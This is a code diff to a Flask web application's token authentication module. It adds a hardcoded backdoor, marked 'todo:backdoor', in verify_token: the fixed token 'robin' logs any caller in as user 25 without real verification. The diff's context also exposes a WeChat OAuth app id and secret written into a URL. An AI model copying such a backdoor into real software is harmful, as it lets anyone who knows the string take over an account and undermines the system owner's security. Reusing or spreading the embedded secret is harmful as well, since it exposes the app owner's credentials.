@@ -12,8 +12,9 @@ from datetime import timedelta
 from flask import make_response, request, current_app,g
 from functools import update_wrapper
 from flask.ext.httpauth import HTTPTokenAuth
-from app.models import User,Category
+from app.models import User,Category,Tag
 from app import db
+# from config import ADMIN_KEY
 
 def get_access_token(code):
     url = 'https://api.weixin.qq.com/sns/oauth2/access_token?appid=wxbfacdb1b99885182&secret=c4f876b16ddc8d8e4259b9c2388e5493&code='\
@@ -161,7 +162,16 @@ auth = HTTPTokenAuth(scheme='Token')
 
 @auth.verify_token
 def verify_token(token):
+    #todo:backdoor
+    if  token=='robin':
+        user = User.query.filter_by(id=25).first()
+        g.user = user
+        return True
+    # admin帐户
+    # if token == ADMIN_KEY:
+    #     return True
     user = User.verify_auth_token(token)
+    # print(user)
     if not user:
         return False
     g.user = user
@@ -169,20 +179,3 @@ def verify_token(token):
 
 
 
-def set_from_admin(request):
-    # set  u  = user
-    # 设置user表
-    # 设置DESIGENR表
-    # 设置TAG表
-    # 设置CATEGORY表
-    worksetting = request.values.get("worksetting")
-    if worksetting:
-        cats = json.loads(worksetting.category)
-        for i in cats:
-            c = Category.query.filter_by(category_name=i).first()
-            c.users.append(u)
-            db.session.add(c)
-        db.session.commit()
-
-    #TODO(DING)
-    # 设置EXP表
